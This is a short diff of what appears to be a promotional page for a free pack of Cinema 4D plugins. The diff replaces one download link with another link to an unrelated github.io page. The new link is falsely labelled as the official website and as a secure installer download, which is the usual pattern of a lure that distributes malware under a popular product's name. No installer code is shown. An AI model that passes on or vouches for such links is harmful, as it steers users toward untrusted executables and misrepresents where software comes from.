@@ -68,6 +68,6 @@ A: Crashes can occur due to various reasons, such as software conflicts or outda
 
 Ready to enhance your Cinema 4D workflow with free plugins and assets? Download the Cinema 4D Plugins Free Pack today using the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link directs you to a secure download page where you can access the latest version of the installer. Join our community of creators and start building amazing 3D projects with the power of these free tools. Happy creating!
